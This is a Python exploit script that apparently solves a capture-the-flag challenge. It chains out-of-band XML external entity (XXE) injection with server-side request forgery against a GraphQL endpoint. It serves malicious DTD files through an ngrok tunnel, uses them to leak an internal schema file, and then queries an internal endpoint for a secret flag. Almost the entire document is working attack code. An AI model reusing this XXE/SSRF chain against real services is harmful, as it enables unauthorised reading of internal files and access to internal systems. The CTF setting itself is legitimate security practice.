import threading, requests, base64, urllib.parse, re, os, json
from http.server import SimpleHTTPRequestHandler, HTTPServer
from pyngrok import ngrok

TARGET_URL = "https://dskjagncfuiolahmfsudafxhasofxhausifas.chals.nitephase.live/graphql"
LOCAL_PORT = 8078

class QuietHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args): pass

threading.Thread(target=lambda: HTTPServer(('0.0.0.0', LOCAL_PORT), QuietHandler).serve_forever(), daemon=True).start()

try:
    public_url = ngrok.connect(LOCAL_PORT).public_url

    #Getting Schema and decoding it
    with open("schema.dtd", "w") as f:
        f.write('<!ENTITY sch SYSTEM "http://127.0.0.1:8000/internal/file?name=schema.graphql">')
    
    xml_schema = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "{public_url}/schema.dtd">%remote;]><root>&sch;</root>'
    res_schema = requests.post(TARGET_URL, data=xml_schema, headers={"Content-Type": "application/xml"}).text
    
    try:
        decoded_schema = base64.b64decode(res_schema).decode()
        print(f"Schema:\n{decoded_schema}\n")
    except:
        print(f"Raw Response (Decode Failed): {res_schema}\n")

    # Checking Query (Audit Logs)
    logs_query = {"query": "{ auditLogs { id action actorId targetNodeId timestamp details } }"}
    res_logs = requests.post(TARGET_URL, json=logs_query).text
    print(f"[Step 2] Audit Logs:\n{res_logs}\n")

    # Getting The Flag After the secret:flag node hint from audit logs
    query = urllib.parse.quote('{node(id:"' + base64.b64encode(b"secret:flag").decode() + '"){...on secret{flag}}}')
    with open("flag.dtd", "w") as f:
        f.write(f'<!ENTITY flg SYSTEM "http://127.0.0.1:8000/internal/graphql?query={query}">')

    xml_flag = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "{public_url}/flag.dtd">%remote;]><root>&flg;</root>'
    res_flag = requests.post(TARGET_URL, data=xml_flag, headers={"Content-Type": "application/xml"}).text
    
    flag = re.search(r'nite\{[^}]+\}', res_flag)
    print(f"Flag: {flag.group(0) if flag else res_flag}")

finally:
    ngrok.kill()
    for f in ["schema.dtd", "flag.dtd"]:
        if os.path.exists(f): os.remove(f)
